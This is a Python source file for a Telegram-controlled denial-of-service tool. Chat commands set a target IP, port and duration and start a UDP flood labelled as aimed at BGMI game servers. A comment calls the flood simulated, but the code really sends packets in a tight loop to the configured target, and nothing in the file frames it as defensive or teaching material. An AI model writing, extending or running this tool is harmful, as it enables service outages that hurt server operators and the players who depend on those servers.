import yaml
import telebot
from telebot import types
import threading
import time
import socket

# Load configuration from YAML file
with open("attack_status.yaml", "r") as file:
    config = yaml.safe_load(file)

API_TOKEN = config["telegram"]["api_token"]
bot = telebot.TeleBot(API_TOKEN)
chat_id = config["telegram"]["chat_id"]

# Attack status tracking
attack_status = {
    "running": False,
    "start_time": 0,
    "duration": 0,
    "target_ip": config["attack"]["target_ip"],
    "target_port": config["attack"]["target_port"],
    "attack_duration": config["attack"]["attack_duration"],
}

def start_attack():
    global attack_status
    attack_status["running"] = True
    attack_status["start_time"] = time.time()
    bot.send_message(chat_id, "✅ Attack started! Targeting BGMI game servers...")
    # Simulate UDP DDos attack
    threading.Thread(target=udp_attack).start()

def check_status():
    global attack_status
    if attack_status["running"]:
        duration = int(time.time() - attack_status["start_time"])
        bot.send_message(
            chat_id,
            f"📊 Attack status: Running for {duration} seconds",
        )
    else:
        bot.send_message(chat_id, "❌ Attack is not running.")

def udp_attack():
    target_ip = attack_status["target_ip"]
    target_port = attack_status["target_port"]
    attack_duration = attack_status["attack_duration"]
    end_time = time.time() + attack_duration

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        sock.sendto(b"BGMI-UDP-Attack", (target_ip, target_port))
    sock.close()
    attack_status["running"] = False
    bot.send_message(chat_id, "🎉 Attack completed successfully!")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text.startswith("/foreststart"):
        start_attack()
    elif message.text.startswith("/foreststatus"):
        check_status()
    elif message.text.startswith("/forestsetip"):
        new_ip = message.text.split(" ")[1]
        attack_status["target_ip"] = new_ip
        bot.send_message(chat_id, f"✅ IP address updated to {new_ip}")
    elif message.text.startswith("/forestsetport"):
        new_port = int(message.text.split(" ")[1])
        attack_status["target_port"] = new_port
        bot.send_message(chat_id, f"✅ Port updated to {new_port}")
    elif message.text.startswith("/forestsetduration"):
        new_duration = int(message.text.split(" ")[1])
        attack_status["attack_duration"] = new_duration
        bot.send_message(chat_id, f"✅ Duration updated to {new_duration} seconds")
    else:
        bot.reply_to(message, "❌ Unknown command. Please use /foreststart, /foreststatus, /forestsetip, /forestsetport, or /forestsetduration.")

# Save updated configuration back to YAML file
@bot.callback_query_handler(func=lambda call: True)
def save_config(call):
    with open("attack_status.yaml", "w") as file:
        yaml.safe_dump(config, file)
    bot.answer_callback_query(call.id, "✅ Configuration saved successfully!")

# Start the bot
bot.infinity_polling()
